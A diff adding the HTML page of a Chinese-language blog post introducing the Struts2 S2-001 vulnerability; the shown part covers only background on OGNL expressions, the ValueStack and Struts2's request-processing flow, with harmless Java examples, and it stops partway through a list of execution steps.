@@ -1,0 +1,1931 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Java反序列化入门之S2-001分析, hybcx&#39;s blog">
+    <meta name="description" content="0x01 前言
+跟着师傅的指导，再来看看Structs2的漏（最近hvv也一直背的面经）。最近学习路上总是emo，发现自己以前学的不扎实，而且串联不起来，很混乱，目前还没找到解决的办法，只能说，先认真对待当下的每一次所学习的东西。日后在整理">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Java反序列化入门之S2-001分析 | hybcx&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">hybcx&#39;s blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Java反序列化入门之S2-001分析</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                <span class="chip bg-color">Java反序列化</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-category">
+                                Java反序列化
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2024-04-15
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2024-04-23
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    8.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    32 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1>0x01 前言</h1>
+<p>跟着师傅的指导，再来看看Structs2的漏（最近hvv也一直背的面经）。最近学习路上总是emo，发现自己以前学的不扎实，而且串联不起来，很混乱，目前还没找到解决的办法，只能说，先认真对待当下的每一次所学习的东西。日后在整理一下思绪。</p>
+<h1>0x02 概述</h1>
+<p>自 Struts2 在 2007 年爆出第一个远程代码执行漏洞 S2-001 以来，在其后续的发展过程中不断爆出更多而且危害更大的远程代码执行漏洞，而造成 Struts2 这么多 RCE 漏洞的主要原因就是 OGNL 表达式。这里以 Struts2 的第一个漏洞 S2-001 为例来对 Struts2 远程代码执行漏洞进行学习</p>
+<p>在这之前，也是简单过了一下Java se等基础，希望接下来分析能够顺利些</p>
+<h1>0x03 前置知识</h1>
+<h2 id="OGNL-简介">OGNL 简介</h2>
+<p>首先来了解 OGNL 表达式，OGNL（Object Graphic Navigatino Language）的中文全称为“对象图导航语言”，是应用于Java中的一个开源的功能强大的表达式语言（Expression Language），它被集成在Struts2等框架中，通过简单一致的表达式语法，可以存取对象的任何属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。</p>
+<p>OGNL进行对象存取操作的API在Ognl.java文件中，分别是getValue、setValue两个方法。getValue通过传入的OGNL表达式，在给定的上下文环境中，从root对象里取值：</p>
+<p>创建一个Student类</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token class-name">StudentNumber</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token class-name">TheClass</span> theClass<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getStudentNumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token class-name">StudentNumber</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setStudentNumber</span><span class="token punctuation">(</span><span class="token class-name">String</span> studentNumber<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">StudentNumber</span> <span class="token operator">=</span> studentNumber<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">TheClass</span> <span class="token function">getTheClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> theClass<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setTheClass</span><span class="token punctuation">(</span><span class="token class-name">TheClass</span> theClass<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>theClass <span class="token operator">=</span> theClass<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>定义一个School类</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">School</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token class-name">String</span> schoolName<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getSchoolName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> schoolName<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSchoolName</span><span class="token punctuation">(</span><span class="token class-name">String</span> schoolName<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>schoolName <span class="token operator">=</span> schoolName<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>最后一个TheClass类</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TheClass</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token class-name">String</span> className<span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token class-name">School</span> school<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> className<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token class-name">String</span> className<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>className <span class="token operator">=</span> className<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">School</span> <span class="token function">getSchool</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> school<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSchool</span><span class="token punctuation">(</span><span class="token class-name">School</span> school<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>school <span class="token operator">=</span> school<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>分别定义相应的属性，并设置get、set方法</p>
+<p>之后添加ognl jar包作为相应的库，随后在定义一个TestOgnl类</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">ognl<span class="token punctuation">.</span></span><span class="token class-name">Ognl</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">ognl<span class="token punctuation">.</span></span><span class="token class-name">OgnlException</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestOgnl</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">OgnlException</span> <span class="token punctuation">{</span>
+        <span class="token class-name">Student</span> student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">TheClass</span> theClass <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TheClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">School</span> school <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">School</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        school<span class="token punctuation">.</span><span class="token function">setSchoolName</span><span class="token punctuation">(</span><span class="token string">"一中"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        theClass<span class="token punctuation">.</span><span class="token function">setSchool</span><span class="token punctuation">(</span>school<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        theClass<span class="token punctuation">.</span><span class="token function">setClassName</span><span class="token punctuation">(</span><span class="token string">"三班"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        student<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"hybcx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        student<span class="token punctuation">.</span><span class="token function">setStudentNumber</span><span class="token punctuation">(</span><span class="token string">"003"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        student<span class="token punctuation">.</span><span class="token function">setTheClass</span><span class="token punctuation">(</span>theClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">String</span> schoolName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token class-name">Ognl</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token string">"#root.theClass.school.schoolName"</span><span class="token punctuation">,</span> student<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>schoolName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>分别给对应的属性赋值，接着我们是想要获取到其中的schoolName属性值</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418095422742.png" alt="image-20240418095422742"></p>
+<p>我们可以与传统的方法比较一下，如果想要获取schoolName属性值，就需要实例化对应类，然后调用get方法。但如果使用ognl的getValue方法，就只需要传递一个ognl表达式和根节点就能取出指定对象的属性值。</p>
+<h2 id="OGNL-三要素">OGNL 三要素</h2>
+<p>OGNL具有三要素：表达式（expression）、根对象（root）和上下文对象（context）。</p>
+<ul>
+<li>表达式（expression）：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作；</li>
+<li>根对象（root）：root可以理解为OGNL的操作对象，OGNL可以对root进行取值或写值等操作，表达式规定了“做什么”，而根对象则规定了“对谁操作”。实际上根对象所在的环境就是 OGNL 的上下文对象环境；</li>
+<li>上下文对象（context）：context可以理解为对象运行的上下文环境，context以MAP的结构、利用键值对关系来描述对象中的属性以及值；</li>
+</ul>
+<p>这样不难知道，OGNL的context是包含root的。</p>
+<p>Struts2中的ActionContext即为OGNL的context（又称context map），其中包含的ValueStack即为OGNL的root。该ActionContext包含的对象如图：</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418101707352.png" alt="image-20240418101707352"></p>
+<h2 id="ValueStack">ValueStack</h2>
+<p>值栈（ValueStack）就是OGNL表达式存取数据的地方。在一个值栈中，封装了一次请求所需要的所有数据。</p>
+<p>在使用Struts2的项目中，Struts2会为每个请求创建一个新的值栈，也就是说，值栈和请求是一一对应的关系，这种一一对应的关系使值栈能够线程安全地为每个请求提供公共的数据存取服务。</p>
+<h3 id="值栈的作用">值栈的作用</h3>
+<p>值栈可以作为一个数据中转站在前台与后台之间传递数据，最常见的就是将Struts2的标签与OGNL表达式结合使用。值栈实际上是一个接口，在Struts2中利用OGNL时，实际上使用的就是实现了该接口的OgnlValueStack类，这个类是OGNL的基础。</p>
+<p>值栈贯穿整个Action的生命周期，每个Action类的对象实例都拥有一个ValueStack对象，在ValueStack对象中保存了当前Action对象和其他相关对象。</p>
+<p>要获取值栈中存储的数据，首先应该获取值栈。值栈的获取有两种方式，具体如下。</p>
+<h4 id="request中获取值栈">request中获取值栈</h4>
+<p>ValueStack对象在request范围内的存储方式为<code>request.setAttribute("struts.valueStack",valuestack)</code>，可以通过如下方式从request中取出值栈的信息。</p>
+<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token comment">//获取 ValueStack 对象，通过 request 对象获取</span>
+ValueStack valueStack = <span class="token punctuation">(</span>ValueStack<span class="token punctuation">)</span>ServletActionContext.<span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+            .<span class="token function">getAttribute</span><span class="token punctuation">(</span>ServletActionContext.STRUTS_VALUESTACK_KEY<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>在上述示例代码中，ServletActionContext.STRUTS_VALUESTACK_KEY是ServletActionContext类中的常量，它的值为struts.valueStack。</p>
+<h4 id="ActionContext中获取值栈">ActionContext中获取值栈</h4>
+<p>在使用Struts2框架时，可以使用OGNL操作Context对象从ValueStack中存取数据，也就是说，可以从Context对象中获取ValueStack对象。实际上，Struts2框架中的Context对象就是ActionContext。</p>
+<p>ActionContext获取ValueStack对象的方式如下所示：</p>
+<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token comment">//通过 ActionContext 获取 valueStack 对象</span>
+ValueStack valueStack = ActionContext.<span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span>.<span class="token function">getValueStack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>ActionContext对象是在StrutsPrepareAndExcuteFilter的doFilter()方法中被创建的，在源码中用于创建ActionContext对象的createActionContext()方法内可以找到获取的ValueStack对象的信息。</p>
+<p>方法中还有这样一段代码：</p>
+<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">ctx = new <span class="token function">ActionContext</span><span class="token punctuation">(</span>stack.<span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>从上述代码中可以看出，ValueStack对象中的Context对象被作为参数传递给了ActionContext对象，这也就说明ActionContext对象中持有了ValueStack对象的引用，因此可以通过ActionContext对象获取ValueStack对象。</p>
+<h2 id="Struts2-执行流程">Struts2 执行流程</h2>
+<p>首先来简单了解 Struts2 的执行流程。官方提供的 Struts2 的架构如图：</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240418102511361.png" alt="image-20240418102511361"></p>
+<p>在该图中，一共给出了四种颜色的标识，其对应的意义如下。</p>
+<ul>
+<li>Servlet Filters(橙色)：过滤器，所有的请求都要经过过滤器的处理。</li>
+<li>Struts Core(浅蓝色)：Struts2的核心部分。</li>
+<li>Interceptors(浅绿色)：Struts2的拦截器。</li>
+<li>User created(浅黄色)：需要开发人员创建的部分。</li>
+</ul>
+<p>图中的一些组件的作用如下：</p>
+<ul>
+<li><strong>FilterDispatcher</strong>：是整个Struts2的调度中心，也就是整个MVC架构中的C，它根据ActionMapper的结果来决定是否处理请求。</li>
+<li><strong>ActionMapper</strong>：用来判断传入的请求是否被Struts2处理，如果需要处理的话，ActionMapper就会返回一个对象来描述请求对应的ActionInvocation的信息。</li>
+<li><strong>ActionProxy</strong>：用来创建一个ActionInvocation代理实例，它位于Action和xwork之间。</li>
+<li><strong>ConfigurationManager</strong>：是xwork配置的管理中心，可以把它当做已经读取到内存中的<code>struts.xml</code>配置文件。</li>
+<li><strong>struts.xml</strong>：是Stuts2的应用配置文件，负责诸如URL与Action之间映射的配置、以及执行后页面跳转的Result配置等。</li>
+<li><strong>ActionInvocation</strong>：用来真正的调用并执行Action、拦截器和对应的Result，作用类似于一个调度器。</li>
+<li><strong>Interceptor</strong>：拦截器，可以自动拦截Action，主要在Action运行之前或者Result运行之后来进行执行，开发者可以自定义。</li>
+<li><strong>Action</strong>：是Struts2中的动作执行单元。用来处理用户请求，并封装业务所需要的数据。</li>
+<li><strong>Result</strong>：是不同视图类型的抽象封装模型，不同的视图类型会对应不同的Result实现，Struts2中支持多种视图类型，比如Jsp，FreeMarker等。</li>
+<li><strong>Templates</strong>：各种视图类型的页面模板，比如JSP就是一种模板页面技术。</li>
+<li><strong>Tag Subsystem</strong>：Struts2的标签库，它抽象了三种不同的视图技术JSP、velocity、freemarker，可以在不同的视图技术中，几乎没有差别的使用这些标签。</li>
+</ul>
+<p>接下来我们可以结合上图，来了解下Struts2框架是如何处理一个HTTP请求的。</p>
+<p>当HTTP请求发送到Web服务器之后，Web服务器根据用户的请求以及<code>web.xml</code>中的配置文件，将请求转发给<code>Struts2</code>框架进行处理。</p>
+<ol>
+<li>HTTP请求经过一系列的过滤器，最后到达<code>FilterDispatcher</code>过滤器。</li>
+<li><code>FilterDispatcher</code>将请求转发给<code>ActionMapper</code>，判断该请求是否需要处理。</li>
+<li>如果该请求需要处理，<code>FilterDispatcher</code>会创建一个<code>ActionProxy</code>来进行后续的处理。</li>
+<li><code>ActionProxy</code>拿着HTTP请求，询问<code>struts.xml</code>该调用哪一个<code>Action</code>进行处理。</li>
+<li>当知道目标<code>Action</code>之后，实例化一个<code>ActionInvocation</code>来进行调用。</li>
+<li>然后运行在<code>Action</code>之前的拦截器，图中就是拦截器1、2、3。</li>
